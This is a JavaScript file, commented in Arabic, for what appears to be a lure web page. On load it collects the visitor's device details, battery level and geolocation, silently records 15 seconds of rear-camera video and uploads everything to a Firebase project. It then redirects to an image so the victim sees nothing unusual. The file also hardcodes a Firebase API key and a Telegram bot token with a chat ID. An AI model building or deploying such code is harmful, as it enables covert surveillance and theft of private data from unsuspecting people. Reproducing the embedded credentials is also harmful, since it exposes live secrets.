import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
import { getDatabase, ref as dbRef, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAPd-LuhhGPJqg4f9v7-s8-KxHwVkDAfOo",
  authDomain: "omarocoo-5c4a1.firebaseapp.com",
  databaseURL: "https://omarocoo-5c4a1-default-rtdb.firebaseio.com",
  projectId: "omarocoo-5c4a1",
  storageBucket: "omarocoo-5c4a1.appspot.com",
  messagingSenderId: "643985793304",
  appId: "1:643985793304:web:b3caa2b157b64f2acd3e6d"
};

// تهيئة تطبيق Firebase
const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const database = getDatabase(app);

const TELEGRAM_BOT_TOKEN = "7639077977:AAENzzjVLnZIFj8FtryqN4JFED7HUSBP0-w";
const CHAT_ID = "7927406022";

const video = document.getElementById('video');

// اختبار الاتصال بقاعدة البيانات
function testDatabaseConnection() {
  const testRef = dbRef(database, 'test_connection');
  set(testRef, {
    timestamp: new Date().toISOString(),
    message: 'تم الاتصال بنجاح'
  })
  .then(() => {
    console.log('✅ تم الاتصال بقاعدة البيانات بنجاح');
  })
  .catch((error) => {
    console.error('❌ فشل الاتصال بقاعدة البيانات:', error);
  });
}

// ارسال معلومات الجهاز الى Firebase Realtime Database
async function sendDeviceInfo() {
  console.log('📱 جاري جمع معلومات الجهاز...');
  
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timestamp: new Date().toISOString()
  };

  try {
    const battery = await navigator.getBattery();
    info.batteryLevel = battery.level;
    console.log(`🔋 مستوى البطارية: ${battery.level * 100}%`);
  } catch (e) {
    console.warn('⚠️ لا يمكن الوصول إلى معلومات البطارية');
  }

  const sendInfo = (locationInfo = null) => {
    if (locationInfo) {
      info.location = locationInfo;
      console.log(`📍 الموقع: ${locationInfo.lat}, ${locationInfo.lon}`);
    }
    
    console.log('💾 جاري حفظ معلومات الجهاز...');
    // استخدام push لإنشاء مفتاح فريد تلقائيًا
    const infoRef = push(dbRef(database, 'deviceInfo'));
    set(infoRef, info)
      .then(() => {
        console.log('✅ تم حفظ معلومات الجهاز بنجاح');
      })
      .catch((error) => {
        console.error('❌ فشل حفظ معلومات الجهاز:', error);
      });
  };

  try {
    console.log('🧭 جاري محاولة الحصول على الموقع...');
    navigator.geolocation.getCurrentPosition((pos) => {
      sendInfo({ lat: pos.coords.latitude, lon: pos.coords.longitude });
    }, (err) => {
      console.warn('⚠️ لا يمكن الوصول إلى الموقع:', err);
      sendInfo();
    });
  } catch (e) {
    console.warn('⚠️ خطأ في الوصول إلى الموقع:', e);
    sendInfo();
  }
}

// رفع الفيديو إلى Firebase Storage وحفظ الرابط في Realtime Database
function uploadToFirebase(videoBlob) {
  console.log("🎬 بدء عملية رفع الفيديو...");
  console.log(`📊 حجم الفيديو: ${(videoBlob.size / 1024 / 1024).toFixed(2)} ميجابايت`);
  
  if (videoBlob.size === 0) {
    console.error("❌ خطأ: حجم الفيديو صفر!");
    return;
  }
  
  // إنشاء اسم فريد للملف
  const fileName = `video_${Date.now()}.mp4`;
  const storageRef = ref(storage, 'videos/' + fileName);
  
  console.log("⬆️ جاري رفع الفيديو إلى Storage...");
  uploadBytes(storageRef, videoBlob)
    .then((snapshot) => {
      console.log(`✅ تم رفع الفيديو بنجاح! البايتات المرفوعة: ${snapshot.bytesTransferred}`);
      console.log("🔗 جاري الحصول على رابط التحميل...");
      return getDownloadURL(storageRef);
    })
    .then((downloadURL) => {
      console.log('🔗 تم الحصول على رابط الفيديو:', downloadURL);
      
      // استخدام push لإنشاء مفتاح فريد تلقائيًا
      const videosRef = dbRef(database, 'videos');
      const newVideoRef = push(videosRef);
      
      const videoData = {
        fileName: fileName,
        timestamp: new Date().toISOString(),
        videoURL: downloadURL,
        size: videoBlob.size,
        cameraType: "خلفية" // إضافة معلومات نوع الكاميرا
      };
      
      console.log("💾 جاري حفظ بيانات الفيديو في Database...", videoData);
      
      return set(newVideoRef, videoData);
    })
    .then(() => {
      console.log('✅ تم حفظ بيانات الفيديو في قاعدة البيانات بنجاح!');
    })
    .catch((error) => {
      console.error('❌ حدث خطأ أثناء رفع الفيديو أو حفظ الرابط:', error);
    });
}

// تسجيل الفيديو باستخدام الكاميرا الخلفية
async function startVideoCapture() {
  console.log('📷 جاري بدء تشغيل الكاميرا الخلفية...');
  
  try {
    const constraints = { 
      video: { 
        facingMode: "environment", // هنا تم تغيير الكاميرا من أمامية إلى خلفية
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }, 
      audio: false 
    };
    
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.play();
    
    console.log('✅ تم تشغيل الكاميرا الخلفية بنجاح');
    
    // إنشاء مسجل الفيديو
    const options = { mimeType: 'video/webm;codecs=vp9,opus' };
    const recorder = new MediaRecorder(stream, options);
    const chunks = [];
    
    recorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunks.push(event.data);
        console.log(`📊 تم استلام جزء من البيانات: ${(event.data.size / 1024).toFixed(2)} كيلوبايت`);
      }
    };
    
    recorder.onstart = () => {
      console.log('▶️ بدأ تسجيل الفيديو...');
    };
    
    recorder.onstop = () => {
      console.log('⏹️ تم إيقاف تسجيل الفيديو');
      const videoBlob = new Blob(chunks, { type: 'video/mp4' });
      console.log(`📊 إجمالي حجم الفيديو: ${(videoBlob.size / 1024 / 1024).toFixed(2)} ميجابايت`);
      
      // رفع الفيديو
      uploadToFirebase(videoBlob);
      
      // إيقاف تشغيل الكاميرا
      stream.getTracks().forEach(track => {
        track.stop();
        console.log('🛑 تم إيقاف مسار الكاميرا');
      });
    };
    
    recorder.onerror = (event) => {
      console.error('❌ خطأ في التسجيل:', event.error);
    };
    
    // بدء التسجيل
    console.log('▶️ جاري بدء المسجل...');
    recorder.start(1000); // تقسيم التسجيل إلى أجزاء كل 1 ثانية
    
    // إيقاف التسجيل بعد 15 ثانية
    console.log('⏱️ تم ضبط مؤقت لإيقاف التسجيل بعد 15 ثانية');
    setTimeout(() => {
      if (recorder.state !== 'inactive') {
        recorder.stop();
      }
    }, 15000);
    
  } catch (error) {
    console.error('❌ فشل تشغيل الكاميرا الخلفية:', error);
    
    // محاولة استخدام الكاميرا المتاحة إذا فشلت الكاميرا الخلفية
    console.log('🔄 جاري محاولة استخدام أي كاميرا متاحة...');
    try {
      const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      video.srcObject = fallbackStream;
      video.play();
      console.log('✅ تم تشغيل كاميرا بديلة بنجاح');
      // تكرار نفس الكود من الأعلى (يمكن تحسينه لتجنب التكرار)
    } catch (fallbackError) {
      console.error('❌ فشل تشغيل أي كاميرا:', fallbackError);
    }
  }
}

// تشغيل التسجيل بعد إرسال معلومات الجهاز
async function startCapture() {
  try {
    console.log('🚀 بدء عملية الالتقاط...');
    
    // اختبار الاتصال بالقاعدة أولاً
    testDatabaseConnection();
    
    // إرسال معلومات الجهاز
    await sendDeviceInfo();
    
    // بدء تسجيل الفيديو
    await startVideoCapture();
    
    // زيادة المهلة قبل التوجيه لإعطاء وقت كافٍ لرفع الفيديو
    console.log('⏱️ تم ضبط مؤقت للتوجيه بعد 30 ثانية');
    setTimeout(() => {
      console.log('↪️ جاري التوجيه إلى الرابط...');
      window.location.href = "https://g.top4top.io/p_3382olbdr0.jpg";
    }, 30000); // 30 ثانية
    
  } catch (error) {
    console.error('❌ حدث خطأ أثناء عملية الالتقاط:', error);
  }
}

// تنفيذ البرنامج عند اكتمال تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
  console.log('📄 تم تحميل الصفحة بالكامل');
  // إضافة تأخير قصير قبل البدء للتأكد من جاهزية كل شيء
  setTimeout(startCapture, 1000);
});